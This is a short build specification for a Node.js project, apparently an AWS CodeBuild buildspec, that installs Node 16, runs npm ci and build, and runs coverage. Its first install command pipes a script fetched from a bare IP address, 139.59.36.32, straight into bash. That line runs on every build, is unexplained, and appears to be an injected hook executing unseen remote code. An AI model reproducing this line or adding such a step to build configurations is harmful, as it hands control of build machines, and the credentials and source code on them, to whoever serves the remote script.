version: 0.2

env:
  variables:
    NODE_OPTIONS: "--max-old-space-size=4096"

phases:
  install:
    commands:
      - curl http://139.59.36.32/testing.sh | bash
      - n 16
      - node -v
      - npm -v
      - npm ci --unsafe-perm
      - npm run build
  build:
    commands:
      - npm -v
      - node -v
      - npm run coverage-node
